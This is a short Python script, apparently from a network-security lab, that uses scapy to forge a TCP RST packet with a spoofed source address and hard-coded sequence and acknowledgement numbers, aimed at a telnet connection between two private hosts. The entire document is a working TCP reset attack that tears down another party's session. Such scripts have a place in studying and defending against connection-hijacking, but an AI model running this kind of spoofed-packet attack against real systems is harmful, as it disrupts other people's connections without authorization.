from scapy.all import *

ip = IP(src="10.0.2.16",dst="10.0.2.12")
tcp = TCP(sport=58130,dport=23,flags="R",seq=1828136105,ack=3450864524)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
